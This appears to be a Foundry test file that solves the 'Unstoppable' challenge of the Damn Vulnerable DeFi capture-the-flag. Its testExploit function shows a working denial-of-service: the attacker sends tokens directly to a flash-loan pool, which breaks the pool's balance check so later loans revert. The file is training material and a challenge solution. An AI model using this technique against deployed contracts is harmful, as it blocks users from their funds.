// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import "forge-std/Test.sol";
import {UnstoppableLender} from "src/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "src/unstoppable/ReceiverUnstoppable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "src/DamnValuableToken.sol";


/// https://book.getfoundry.sh/forge/writing-tests
contract Unstoppable is Test {


    uint256 internal constant TOKENS_IN_POOL = 100000 ether;
    uint256 internal constant INITIAL_ATTACKER_BALANCE = 100 ether;

    DamnValuableToken internal damnValuableToken;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
  
    address internal deployer;
    address internal attacker;
    address internal someUser;

    function setUp() public {
        // solhint-disable-previous-line no-empty-blocks
        deployer = vm.addr(1);
        vm.label(deployer, "deployer");
        attacker = vm.addr(2);
        vm.label(attacker, "attacker");
        someUser = vm.addr(3);
        vm.label(someUser, "someUser");

        damnValuableToken = new DamnValuableToken();
        vm.label(address(damnValuableToken), "damnValuableToken");
        unstoppableLender = new UnstoppableLender(address(damnValuableToken));
        vm.label(address(unstoppableLender), "unstoppableLender");

        damnValuableToken.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        damnValuableToken.transfer(attacker, INITIAL_ATTACKER_BALANCE);

        assertEq(damnValuableToken.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);

        assertEq(damnValuableToken.balanceOf(address(attacker)), INITIAL_ATTACKER_BALANCE);

        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
        receiverUnstoppable.executeFlashLoan(10);
        vm.label(address(receiverUnstoppable), "receiverUnstoppable");
        vm.stopPrank();
    }


    /// @dev Run Forge with `-vvvv` to see console logs.
    function testExploit() public {

        vm.startPrank(attacker);
        damnValuableToken.transfer(address(unstoppableLender), INITIAL_ATTACKER_BALANCE);
        vm.stopPrank();
        vm.expectRevert();
        validate();
    }

    function validate() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}